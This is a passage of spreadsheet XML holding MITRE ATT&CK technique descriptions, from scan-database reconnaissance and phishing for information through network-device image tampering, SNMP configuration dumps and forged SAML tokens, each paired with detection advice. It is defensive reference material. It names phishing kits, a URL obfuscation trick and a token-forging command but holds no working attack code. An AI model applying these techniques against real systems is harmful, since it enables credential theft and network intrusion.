Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources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[Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).</t>
  </si>
  <si>
    <t>T1596.005</t>
  </si>
  <si>
    <t>Scan Databases (T1596.005)</t>
  </si>
  <si>
    <t>Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)
Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)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</si>
  <si>
    <t>T1597</t>
  </si>
  <si>
    <t>Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)
Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources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[Valid Accounts](https://attack.mitre.org/techniques/T1078)).</t>
  </si>
  <si>
    <t>T1597.001</t>
  </si>
  <si>
    <t>Threat Intel Vendors (T1597.001)</t>
  </si>
  <si>
    <t>Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)
Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).</t>
  </si>
  <si>
    <t>T1597.002</t>
  </si>
  <si>
    <t>Purchase Technical Data (T1597.002)</t>
  </si>
  <si>
    <t>Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.
Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources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[Valid Accounts](https://attack.mitre.org/techniques/T1078)).</t>
  </si>
  <si>
    <t>T1598</t>
  </si>
  <si>
    <t>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[Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.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credential harvesting campaigns.
Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)
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Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) 
Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)</t>
  </si>
  <si>
    <t>Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)
When it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.
Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).</t>
  </si>
  <si>
    <t>T1598.001</t>
  </si>
  <si>
    <t>Spearphishing Service (T1598.001)</t>
  </si>
  <si>
    <t>Adversaries may send spearphishing messages via third-party services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adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.</t>
  </si>
  <si>
    <t>Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).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</si>
  <si>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T1598.002</t>
  </si>
  <si>
    <t>Adversaries may send spearphishing messages with a malicious attachment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adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.</t>
  </si>
  <si>
    <t>Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)</t>
  </si>
  <si>
    <t>T1598.003</t>
  </si>
  <si>
    <t>Spearphishing Link (T1598.003)</t>
  </si>
  <si>
    <t>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the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)
Adversaries may also embed “tracking pixels”, "web bugs", or "web beacons" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)
Adversaries may also be able to spoof a complete website using what is known as a "browser-in-the-browser" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)
Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)
Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing”). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.
From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.</t>
  </si>
  <si>
    <t>Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)
Monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.</t>
  </si>
  <si>
    <t>T1598.004</t>
  </si>
  <si>
    <t>Spearphishing Voice (T1598.004)</t>
  </si>
  <si>
    <t>Adversaries may use voice communications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[Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.
All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or "vishing"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)
Victims may also receive phishing messages that direct them to call a phone number ("callback phishing") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)
Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.</t>
  </si>
  <si>
    <t>T1599</t>
  </si>
  <si>
    <t>Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.
When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.</t>
  </si>
  <si>
    <t>Consider monitoring network traffic on both interfaces of border network devices with out-of-band packet capture or network flow data, using a different device than the one in question.  Look for traffic that should be prohibited by the intended network traffic policy enforcement for the border network device.
Monitor the border network device’s configuration to validate that the policy enforcement sections are what was intended.  Look for rules that are less restrictive, or that allow specific traffic types that were not previously authorized.</t>
  </si>
  <si>
    <t>T1599.001</t>
  </si>
  <si>
    <t>Network Address Translation Traversal (T1599.001)</t>
  </si>
  <si>
    <t>Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
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
When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  
Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities</t>
  </si>
  <si>
    <t>Consider monitoring network traffic on both interfaces of border network devices.  Compare packets transmitted by the device between networks to look for signs of NAT being implemented.  Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3.  In some cases, Port Address Translation (PAT) may also be used by an adversary.
Monitor the border network device’s configuration to determine if any unintended NAT rules have been added without authorization.</t>
  </si>
  <si>
    <t>T1600</t>
  </si>
  <si>
    <t>Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)
Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.
Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)</t>
  </si>
  <si>
    <t>There is no documented method for defenders to directly identify behaviors that weaken encryption. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601). Some detection methods require vendor support to aid in investigation.</t>
  </si>
  <si>
    <t>T1600.001</t>
  </si>
  <si>
    <t>Reduce Key Space (T1600.001)</t>
  </si>
  <si>
    <t>Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)
Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.
Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)</t>
  </si>
  <si>
    <t>There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.</t>
  </si>
  <si>
    <t>T1600.002</t>
  </si>
  <si>
    <t>Disable Crypto Hardware (T1600.002)</t>
  </si>
  <si>
    <t>Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.
Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)</t>
  </si>
  <si>
    <t>There is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation.</t>
  </si>
  <si>
    <t>T1601</t>
  </si>
  <si>
    <t>Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.
To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.</t>
  </si>
  <si>
    <t>Most embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because this method may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. 
Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.  (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)
Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</t>
  </si>
  <si>
    <t>T1601.001</t>
  </si>
  <si>
    <t>Patch System Image (T1601.001)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.
To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.
To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.
In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.
By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).
Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. 
When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). 
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t>
  </si>
  <si>
    <t>Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)
Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</t>
  </si>
  <si>
    <t>T1601.002</t>
  </si>
  <si>
    <t>Downgrade System Image (T1601.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)
On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.
Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  </t>
  </si>
  <si>
    <t xml:space="preserve">Many embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because image downgrade may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. </t>
  </si>
  <si>
    <t>T1602</t>
  </si>
  <si>
    <t>Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content</t>
  </si>
  <si>
    <t>Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.
Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)</t>
  </si>
  <si>
    <t>Identify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)</t>
  </si>
  <si>
    <t>T1602.001</t>
  </si>
  <si>
    <t>SNMP (MIB Dump) (T1602.001)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).
The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.
Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) </t>
  </si>
  <si>
    <t>Identify network traffic sent or received by untrusted hosts or networks that expose MIB content or use unauthorized protocols.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)</t>
  </si>
  <si>
    <t>T1602.002</t>
  </si>
  <si>
    <t>Network Device Configuration Dump (T1602.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.
Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. </t>
  </si>
  <si>
    <t>Identify network traffic sent or received by untrusted hosts or networks. Configure signatures to identify strings that may be found in a network device configuration.(Citation: US-CERT TA18-068A 2018)</t>
  </si>
  <si>
    <t>T1606</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.
Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.
The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth)
Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  </t>
  </si>
  <si>
    <t>Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.</t>
  </si>
  <si>
    <t>T1606.001</t>
  </si>
  <si>
    <t>Web Cookies (T1606.001)</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, Web Credential: Web Credential Usage</t>
  </si>
  <si>
    <t>Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.
Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.
Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)</t>
  </si>
  <si>
    <t>T1606.002</t>
  </si>
  <si>
    <t>SAML Tokens (T1606.002)</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, Process: Process Creation, User Account: User Account Authentication, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage</t>
  </si>
  <si>
    <t>An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the &lt;code&gt;NotOnOrAfter&lt;/code&gt; value of the &lt;code&gt;conditions ...&lt;/code&gt; element in a token. This value can be changed using the &lt;code&gt;AccessTokenLifetime&lt;/code&gt; in a &lt;code&gt;LifetimeTokenPolicy&lt;/code&gt;.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)
An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.
An adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)</t>
  </si>
  <si>
    <t>This technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.(Citation: Microsoft SolarWinds Customer Guidance) Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain.(Citation: Sygnia Golden SAML)
Consider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.(Citation: Sygnia Golden SAML)</t>
  </si>
  <si>
    <t>T1608</t>
  </si>
  <si>
